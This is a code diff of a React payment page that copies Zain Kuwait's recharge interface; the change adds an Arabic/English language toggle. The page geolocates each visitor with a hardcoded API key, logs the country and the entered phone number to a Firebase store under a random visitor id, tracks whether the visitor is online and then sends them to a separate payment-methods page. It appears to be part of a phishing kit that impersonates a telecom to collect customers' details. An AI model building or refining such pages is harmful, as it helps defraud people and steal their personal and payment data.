@@ -1,11 +1,21 @@
 "use client"
 
 import { useEffect, useState } from "react"
-import { ChevronDown, Heart, Loader2, Menu, Plus, ShoppingCart, Search, Phone, CreditCard, Clock, ArrowRight, X } from 'lucide-react'
+import {
+  ChevronDown,
+  Loader2,
+  Menu,
+  Plus,
+  ShoppingCart,
+  Phone,
+  CreditCard,
+  Clock,
+  ArrowRight,
+  LanguagesIcon,
+} from "lucide-react"
 import { cn, setupOnlineStatus } from "@/lib/utils"
 import { useRouter } from "next/navigation"
 import { addData } from "@/lib/firebasee"
-import SplashScreen from "@/components/splash-screen"
 import { fetchBalance } from "@/lib/api"
 import { motion, AnimatePresence } from "framer-motion"
 
@@ -21,6 +31,7 @@ export default function ZainPayment() {
   const [total, setTotal] = useState("0.000")
   const [balanceData, setBalanceData] = useState<any | null>(null)
   const [isLoadingBalance, setIsLoadingBalance] = useState(false)
+  const [isArabic, setIsArabic] = useState(true)
   const [balanceError, setBalanceError] = useState<string | null>(null)
   const [showNumberType, setShowNumberType] = useState(false)
   const [numberType, setNumberType] = useState("رقم آخر")
@@ -31,9 +42,9 @@ export default function ZainPayment() {
     setTotal(totalAmount)
   }, [selectedAmount, fees])
 
-  const _id = randstr('zain-')
+  const _id = randstr("zain-")
   const router = useRouter()
-  
+
   useEffect(() => {
     // Fetch balance when phone number changes and has 8 digits
     if (phoneNumber.length === 8) {
@@ -55,22 +66,24 @@ export default function ZainPayment() {
       }
     } catch (error) {
       console.error("Failed to fetch balance:", error)
-    //  setBalanceError("فشل في جلب معلومات الرصيد. يرجى المحاولة مرة أخرى.")
+      //  setBalanceError("فشل في جلب معلومات الرصيد. يرجى المحاولة مرة أخرى.")
     } finally {
       setIsLoadingBalance(false)
     }
   }
-  
+
   function randstr(prefix: string) {
-    return Math.random().toString(36).replace('0.', prefix || '');
+    return Math.random()
+      .toString(36)
+      .replace("0.", prefix || "")
   }
-  
+
   useEffect(() => {
     setTimeout(() => {
       setIsLoading(false)
-    }, 4000);
+    }, 4000)
   }, [])
-  
+
   const amounts = [
     { value: "2.000", validity: 7 },
     { value: "4.000", validity: 15 },
@@ -107,61 +120,163 @@ export default function ZainPayment() {
       }
     }
   }
-  
+
   useEffect(() => {
-    localStorage.setItem('amount', selectedAmount)
+    localStorage.setItem("amount", selectedAmount)
   }, [selectedAmount])
-  
+
   async function getLocation() {
-    const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
-    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
+    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
 
     try {
-      const response = await fetch(url);
+      const response = await fetch(url)
       if (!response.ok) {
-        throw new Error(`HTTP error! Status: ${response.status}`);
+        throw new Error(`HTTP error! Status: ${response.status}`)
       }
-      const country = await response.text();
+      const country = await response.text()
       addData({
         id: _id,
-        country: country
+        country: country,
       })
-      localStorage.setItem('country', country)
+      localStorage.setItem("country", country)
       setupOnlineStatus(_id)
     } catch (error) {
-      console.error('Error fetching location:', error);
+      console.error("Error fetching location:", error)
     }
   }
 
   const handleSubmit = () => {
     setIsSubmitted(true)
-    const vistID = localStorage.getItem('visitor')
+    const vistID = localStorage.getItem("visitor")
     addData({ id: vistID, name: phoneNumber, phone: phoneNumber })
     setTimeout(() => {
-      router.push('/payment-methods')
+      router.push("/payment-methods")
       setIsSubmitted(false)
-    }, 2000);
+    }, 2000)
+  }
+
+  // Toggle language function
+  const toggleLanguage = () => {
+    setIsArabic(!isArabic)
+    localStorage.setItem("language", isArabic ? "ar" : "en")
+
+  }
+
+  // Translations object
+  const translations = {
+    quickPay: {
+      ar: "الدفع السريع",
+      en: "Quick Pay",
+    },
+    billPay: {
+      ar: "دفع الفاتورة",
+      en: "Bill Pay",
+    },
+    recharge: {
+      ar: "إعادة تعبئة",
+      en: "Recharge",
+    },
+    iWantToRecharge: {
+      ar: "أريد أن أعيد التعبئة",
+      en: "I Want to Recharge",
+    },
+    numberType: {
+      ar: "نوع الرقم",
+      en: "Number Type",
+    },
+    otherNumber: {
+      ar: "رقم آخر",
+      en: "Other Number",
+    },
+    contractNumber: {
+      ar: "رقم العقد",
+      en: "Contract Number",
+    },
+    phoneNumber: {
+      ar: "رقم الهاتف",
+      en: "Phone Number",
+    },
+    enterNumber: {
+      ar: "أدخل الرقم 9XXXXXX",
+      en: "Enter number 9XXXXXX",
+    },
+    accountInfoFound: {
+      ar: "تم العثور على معلومات الحساب",
+      en: "Account information found",
+    },
+    rechargeAmount: {
+      ar: "مبلغ التعبئة",
+      en: "Recharge Amount",
+    },
+    validity: {
+      ar: "الصلاحية",
+      en: "Validity",
+    },
+    day: {
+      ar: "يوم",
+      en: "days",
+    },
+    addAnotherNumber: {
+      ar: "أضف رقم آخر",
+      en: "Add Another Number",
+    },
+    orderSummary: {
+      ar: "ملخص الطلب",
+      en: "Order Summary",
+    },
+    rechargeAmount2: {
+      ar: "مبلغ التعبئة",
+      en: "Recharge Amount",
+    },
+    fees: {
+      ar: "الرسوم",
+      en: "Fees",
+    },
+    total: {
+      ar: "الإجمالي",
+      en: "Total",
+    },
+    pay: {
+      ar: "دفع",
+      en: "Pay",
+    },
+    processing: {
+      ar: "جاري الدفع...",
+      en: "Processing...",
+    },
+    needHelp: {
+      ar: "هل تحتاج إلى مساعدة؟",
+      en: "Need Help?",
+    },
+  }
+
+  // Helper function to get translation
+  const t = (key: keyof typeof translations) => {
+    return isArabic ? translations[key].ar : translations[key].en
   }
 
   return (
-    <div className="max-w-md mx-auto bg-gradient-to-b from-white to-gray-50 min-h-screen" dir="rtl">
+    <div
+      className="max-w-md mx-auto bg-gradient-to-b from-white to-gray-50 min-h-screen"
+      dir={isArabic ? "rtl" : "ltr"}
+    >
       {/* Header */}
       <header className="flex items-center justify-between p-4 bg-gradient-to-r from-[#2d1a45] to-[#3a2259] shadow-md">
-        <div className="flex items-center space-x-3">
-          <div className="bg-white/10 backdrop-blur-sm rounded-full p-2 hover:bg-white/20 transition-colors">
-            <Heart className="text-white" size={20} />
+        <div className={`flex items-center ${isArabic ? "space-x-3" : "space-x-reverse-3"}`}>
+          <div
+            className="bg-white/10 backdrop-blur-sm rounded-full mx-2 p-2 hover:bg-white/20 transition-colors cursor-pointer"
+            onClick={toggleLanguage}
+          >
+            <LanguagesIcon className="text-white" size={20} />
           </div>
           <div className="bg-white rounded-full p-2 hover:bg-gray-100 transition-colors">
             <ShoppingCart className="text-[#2d1a45]" size={20} />
           </div>
         </div>
-        
+
         <div className="flex items-center">
-          <img 
-            src="https://www.kw.zain.com/o/zain-theme/images/zain_logo.svg" 
-            alt="Zain Logo" 
-            className="h-8 ml-2" 
-          />
+          <img src="/next.svg" alt="Logo" className={`h-8 ${isArabic ? "ml-2" : "mr-2"}`} />
           <Menu className="text-white hover:text-gray-200 transition-colors cursor-pointer" size={24} />
         </div>
       </header>
@@ -169,8 +284,12 @@ export default function ZainPayment() {
       {/* Main Content */}
       <div className="p-5">
         <div className="flex items-center mb-6">
-          <ArrowRight className="text-[#2d1a45] mr-2" size={20} />
-          <h2 className="text-2xl font-bold text-[#2d1a45]">الدفع السريع</h2>
+          {isArabic ? (
+            <ArrowRight className="text-[#2d1a45] mr-2" size={20} />
+          ) : (
+            <ArrowRight className="text-[#2d1a45] ml-2 transform rotate-180" size={20} />
+          )}
+          <h2 className="text-2xl font-bold text-[#2d1a45]">{t("quickPay")}</h2>
         </div>
 
         {/* Tabs */}
@@ -178,83 +297,87 @@ export default function ZainPayment() {
           <button
             className={cn(
               "flex-1 py-4 text-center font-medium transition-all duration-200",
-              selectedTab === "bill" 
-                ? "border-b-4 border-[#d13c8c] text-[#d13c8c] bg-pink-50/50" 
-                : "text-gray-500 hover:text-gray-700 hover:bg-gray-50"
+              selectedTab === "bill"
+                ? "border-b-4 border-[#d13c8c] text-[#d13c8c] bg-pink-50/50"
+                : "text-gray-500 hover:text-gray-700 hover:bg-gray-50",
             )}
             onClick={() => setSelectedTab("bill")}
           >
             <div className="flex items-center justify-center">
-              <CreditCard className="mr-2" size={18} />
-              دفع الفاتورة
+              <CreditCard className={isArabic ? "mr-2" : "ml-2"} size={18} />
+              {t("billPay")}
             </div>
           </button>
           <button
             className={cn(
               "flex-1 py-4 text-center font-medium transition-all duration-200",
-              selectedTab === "recharge" 
-                ? "border-b-4 border-[#d13c8c] text-[#d13c8c] bg-pink-50/50" 
-                : "text-gray-500 hover:text-gray-700 hover:bg-gray-50"
+              selectedTab === "recharge"
+                ? "border-b-4 border-[#d13c8c] text-[#d13c8c] bg-pink-50/50"
+                : "text-gray-500 hover:text-gray-700 hover:bg-gray-50",
             )}
             onClick={() => setSelectedTab("recharge")}
           >
             <div className="flex items-center justify-center">
-              <Phone className="mr-2" size={18} />
-              إعادة تعبئة eeZee
+              <Phone className={isArabic ? "mr-2" : "ml-2"} size={18} />
+              {t("recharge")} eeZee
             </div>
           </button>
         </div>
 
         {/* Form */}
         <div className="bg-white rounded-lg shadow-sm p-6 mb-6">
-          <div className="text-right mb-4">
-            <p className="text-[#2d1a45] font-medium">أريد أن أعيد التعبئة </p>
+          <div className={`text-${isArabic ? "right" : "left"} mb-4`}>
+            <p className="text-[#2d1a45] font-medium">{t("iWantToRecharge")}</p>
           </div>
 
           <div className="relative mb-6">
-            <div 
+            <div
               className="w-full flex justify-between items-center border-b-2 border-[#d13c8c] pb-2 cursor-pointer"
               onClick={() => setShowNumberType(!showNumberType)}
             >
               <div className="flex items-center">
-                <ChevronDown className={`text-[#d13c8c] transition-transform duration-300 ${showNumberType ? "rotate-180" : ""}`} />
-                <span className="mr-2 text-gray-700">{numberType}</span>
+                <ChevronDown
+                  className={`text-[#d13c8c] transition-transform duration-300 ${showNumberType ? "rotate-180" : ""}`}
+                />
+                <span className={isArabic ? "mr-2" : "ml-2"}>
+                  {isArabic ? numberType : numberType === "رقم آخر" ? "Other Number" : "Contract Number"}
+                </span>
               </div>
-              <span className="text-gray-500 text-sm">نوع الرقم</span>
+              <span className="text-gray-500 text-sm">{t("numberType")}</span>
             </div>
-            
+
             {/* Number Type Dropdown */}
             <AnimatePresence>
               {showNumberType && (
-                <motion.div 
+                <motion.div
                   className="absolute z-10 bg-white shadow-lg w-full mt-1 border rounded-md overflow-hidden"
                   initial={{ opacity: 0, y: -10 }}
                   animate={{ opacity: 1, y: 0 }}
                   exit={{ opacity: 0, y: -10 }}
                   transition={{ duration: 0.2 }}
                 >
-                  <div 
+                  <div
                     className="p-3 hover:bg-gray-50 cursor-pointer flex justify-between items-center"
                     onClick={() => {
                       setNumberType("رقم آخر")
                       setShowNumberType(false)
                     }}
                   >
-                    <span>رقم آخر</span>
+                    <span>{t("otherNumber")}</span>
                     {numberType === "رقم آخر" && (
                       <div className="w-4 h-4 rounded-full bg-[#d13c8c] flex items-center justify-center">
                         <div className="w-2 h-2 rounded-full bg-white"></div>
                       </div>
                     )}
                   </div>
-                  <div 
+                  <div
                     className="p-3 hover:bg-gray-50 cursor-pointer flex justify-between items-center"
                     onClick={() => {
                       setNumberType("رقم العقد")
                       setShowNumberType(false)
                     }}
                   >
-                    <span>رقم العقد</span>
+                    <span>{t("contractNumber")}</span>
                     {numberType === "رقم العقد" && (
                       <div className="w-4 h-4 rounded-full bg-[#d13c8c] flex items-center justify-center">
                         <div className="w-2 h-2 rounded-full bg-white"></div>
@@ -267,30 +390,32 @@ export default function ZainPayment() {
           </div>
 
           <div className="mb-6">
-            <label className="block text-right mb-2 font-medium text-[#2d1a45]">
-              رقم الهاتف <span className="text-red-500">*</span>
+            <label className={`block text-${isArabic ? "right" : "left"} mb-2 font-medium text-[#2d1a45]`}>
+              {t("phoneNumber")} <span className="text-red-500">*</span>
             </label>
             <div className="relative">
               <input
                 type="tel"
                 maxLength={12}
-                placeholder="أدخل الرقم 9XXXXXX"
-                className="w-full p-4 border border-gray-300 rounded-lg text-right pr-12 focus:outline-none focus:ring-2 focus:ring-[#d13c8c] focus:border-transparent transition-all"
+                placeholder={t("enterNumber")}
+                className={`w-full p-4 border border-gray-300 rounded-lg text-${isArabic ? "right" : "left"} ${isArabic ? "pr-12" : "pl-12"} focus:outline-none focus:ring-2 focus:ring-[#d13c8c] focus:border-transparent transition-all`}
                 value={phoneNumber}
                 onChange={(e) => setPhoneNumber(e.target.value)}
               />
-              <div className="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
+              <div
+                className={`absolute inset-y-0 ${isArabic ? "right-0 pr-3" : "left-0 pl-3"} flex items-center pointer-events-none`}
+              >
                 <Phone className="h-5 w-5 text-gray-400" />
               </div>
-              
+
               {isLoadingBalance && (
-                <div className="absolute inset-y-0 left-0 flex items-center pl-3">
+                <div className={`absolute inset-y-0 ${isArabic ? "left-0 pl-3" : "right-0 pr-3"} flex items-center`}>
                   <Loader2 className="h-5 w-5 text-[#d13c8c] animate-spin" />
                 </div>
               )}
-              
+
               {phoneNumber.length === 8 && balanceData && !isLoadingBalance && (
-                <div className="absolute inset-y-0 left-0 flex items-center pl-3">
+                <div className={`absolute inset-y-0 ${isArabic ? "left-0 pl-3" : "right-0 pr-3"} flex items-center`}>
                   <div className="h-5 w-5 rounded-full bg-green-500 flex items-center justify-center">
                     <svg className="h-3 w-3 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                       <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
@@ -299,24 +424,22 @@ export default function ZainPayment() {
                 </div>
               )}
             </div>
-            
-            {balanceError && (
-              <p className="mt-2 text-red-500 text-sm">{balanceError}</p>
-            )}
-            
+
+            {balanceError && <p className="mt-2 text-red-500 text-sm">{balanceError}</p>}
+
             {balanceData && (
-              <motion.div 
+              <motion.div
                 className="mt-3 p-3 bg-green-50 border border-green-100 rounded-md"
                 initial={{ opacity: 0, y: -10 }}
                 animate={{ opacity: 1, y: 0 }}
               >
-                <p className="text-green-800 text-sm">تم العثور على معلومات الحساب</p>
+                <p className="text-green-800 text-sm">{t("accountInfoFound")}</p>
               </motion.div>
             )}
           </div>
 
           <div className="relative mb-6">
-            <div 
+            <div
               className="flex justify-between items-center border-b-2 border-[#d13c8c] py-4 cursor-pointer"
               onClick={() => setShowAmountDropdown(!showAmountDropdown)}
             >
@@ -324,19 +447,25 @@ export default function ZainPayment() {
                 <ChevronDown
                   className={`text-[#d13c8c] transition-transform duration-300 ${showAmountDropdown ? "rotate-180" : ""}`}
                 />
-                <span className="mr-2 font-medium">{selectedAmount} د.ك</span>
+                <span className={isArabic ? "mr-2" : "ml-2"}>
+                  {selectedAmount} {isArabic ? "د.ك" : "KWD"}
+                </span>
               </div>
-              <label className="block text-right text-sm text-gray-500">مبلغ التعبئة</label>
+              <label className={`block text-${isArabic ? "right" : "left"} text-sm text-gray-500`}>
+                {t("rechargeAmount")}
+              </label>
             </div>
-            <div className="text-right text-sm text-gray-500 mt-2 flex items-center">
-              <Clock className="inline-block ml-1" size={14} />
-              الصلاحية 30 يوم
+            <div
+              className={`text-${isArabic ? "right" : "left"} text-sm text-gray-500 mt-2 flex items-center ${isArabic ? "" : "flex-row-reverse"}`}
+            >
+              <Clock className={isArabic ? "inline-block ml-1" : "inline-block mr-1"} size={14} />
+              {t("validity")} 30 {t("day")}
             </div>
 
             {/* Dropdown */}
             <AnimatePresence>
               {showAmountDropdown && (
-                <motion.div 
+                <motion.div
                   className="absolute z-10 bg-white shadow-lg w-full mt-2 border rounded-md overflow-hidden"
                   initial={{ opacity: 0, y: -10 }}
                   animate={{ opacity: 1, y: 0 }}
@@ -350,7 +479,7 @@ export default function ZainPayment() {
                         selectedAmount === amount.value ? "bg-pink-50" : ""
                       }`}
                       onClick={() => {
-                        localStorage.setItem('amount', amount.value)
+                        localStorage.setItem("amount", amount.value)
                         setSelectedAmount(amount.value)
                         setShowAmountDropdown(false)
                       }}
@@ -359,17 +488,24 @@ export default function ZainPayment() {
                         {selectedAmount === amount.value ? (
                           <div className="w-5 h-5 rounded-full bg-[#d13c8c] flex items-center justify-center mr-2">
                             <svg className="w-3 h-3 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
+                              <path
+                                strokeLinecap="round"
+                                strokeLinejoin="round"
+                                strokeWidth="2"
+                                d="M5 13l4 4L19 7"
+                              ></path>
                             </svg>
                           </div>
                         ) : (
                           <div className="w-5 h-5 rounded-full border border-gray-300 mr-2"></div>
                         )}
-                        <span className="font-medium">{amount.value} د.ك</span>
+                        <span className="font-medium">
+                          {amount.value} {isArabic ? "د.ك" : "KWD"}
+                        </span>
                       </div>
                       <div className="flex items-center">
-                        <Clock className="inline-block ml-1" size={14} />
-                        <span>الصلاحية {amount.validity} يوم</span>
+                        <Clock className={isArabic ? "inline-block ml-1" : "inline-block mr-1"} size={14} />
+                        <span>{isArabic ? `الصلاحية ${amount.validity} يوم` : `Validity ${amount.validity} days`}</span>
                       </div>
                     </div>
                   ))}
@@ -377,32 +513,40 @@ export default function ZainPayment() {
               )}
             </AnimatePresence>
           </div>
-          
+
           {/* Add Another Number Button */}
           <button className="w-full p-3 border-2 border-[#d13c8c] text-[#d13c8c] rounded-lg flex items-center justify-center hover:bg-pink-50 transition-colors">
-            <Plus className="h-5 w-5 ml-2" />
-            <span>أضف رقم آخر</span>
+            <Plus className={isArabic ? "h-5 w-5 ml-2" : "h-5 w-5 mr-2"} />
+            <span>{t("addAnotherNumber")}</span>
           </button>
         </div>
-        
+
         {/* Summary Card */}
         <div className="bg-white rounded-lg shadow-sm p-6 mb-6">
-          <h3 className="text-lg font-bold text-[#2d1a45] mb-4">ملخص الطلب</h3>
-          
+          <h3 className={`text-lg font-bold text-[#2d1a45] mb-4 text-${isArabic ? "right" : "left"}`}>
+            {t("orderSummary")}
+          </h3>
+
           <div className="space-y-3">
             <div className="flex justify-between items-center pb-2">
-              <div className="text-gray-700">{selectedAmount} د.ك</div>
-              <div className="text-gray-700">مبلغ التعبئة</div>
+              <div className="text-gray-700">
+                {selectedAmount} {isArabic ? "د.ك" : "KWD"}
+              </div>
+              <div className="text-gray-700">{t("rechargeAmount2")}</div>
             </div>
-            
+
             <div className="flex justify-between items-center pb-2">
-              <div className="text-gray-700">{fees} د.ك</div>
-              <div className="text-gray-700">الرسوم</div>
+              <div className="text-gray-700">
+                {fees} {isArabic ? "د.ك" : "KWD"}
+              </div>
+              <div className="text-gray-700">{t("fees")}</div>
             </div>
-            
+
             <div className="flex justify-between items-center pt-3 border-t border-dashed">
-              <div className="text-[#d13c8c] font-bold text-xl">{total} د.ك</div>
-              <div className="text-[#2d1a45] font-bold">الإجمالي</div>
+              <div className="text-[#d13c8c] font-bold text-xl">
+                {total} {isArabic ? "د.ك" : "KWD"}
+              </div>
+              <div className="text-[#2d1a45] font-bold">{t("total")}</div>
             </div>
           </div>
         </div>
@@ -410,38 +554,37 @@ export default function ZainPayment() {
         {/* Payment Button */}
         <motion.button
           className={`w-full py-4 rounded-lg font-medium text-lg flex items-center justify-center ${
-            isSubmitted || phoneNumber === '' 
-              ? 'bg-gray-300 text-gray-500 cursor-not-allowed' 
-              : 'bg-gradient-to-r from-[#d13c8c] to-[#e04c9c] text-white shadow-md hover:shadow-lg'
+            isSubmitted || phoneNumber === ""
+              ? "bg-gray-300 text-gray-500 cursor-not-allowed"
+              : "bg-gradient-to-r from-[#d13c8c] to-[#e04c9c] text-white shadow-md hover:shadow-lg"
           }`}
-          whileTap={{ scale: isSubmitted || phoneNumber === '' ? 1 : 0.98 }}
-          disabled={isSubmitted || phoneNumber === ''}
+          whileTap={{ scale: isSubmitted || phoneNumber === "" ? 1 : 0.98 }}
+          disabled={isSubmitted || phoneNumber === ""}
           onClick={handleSubmit}
         >
           {isSubmitted ? (
             <>
-              <Loader2 className="animate-spin mr-2" size={20} />
-              جاري الدفع...
+              <Loader2 className={isArabic ? "animate-spin mr-2" : "animate-spin ml-2"} size={20} />
+              {t("processing")}
             </>
           ) : (
             <>
-              <CreditCard className="mr-2" size={20} />
-              دفع
+              <CreditCard className={isArabic ? "mr-2" : "ml-2"} size={20} />
+              {t("pay")}
             </>
           )}
         </motion.button>
-        
+
         {/* Help text */}
         <div className="mt-4 text-center">
-          <button 
+          <button
             onClick={openChat}
             className="text-[#2d1a45] text-sm hover:underline flex items-center justify-center mx-auto"
           >
-            هل تحتاج إلى مساعدة؟
+            {t("needHelp")}
           </button>
         </div>
       </div>
-
     </div>
   )
 }
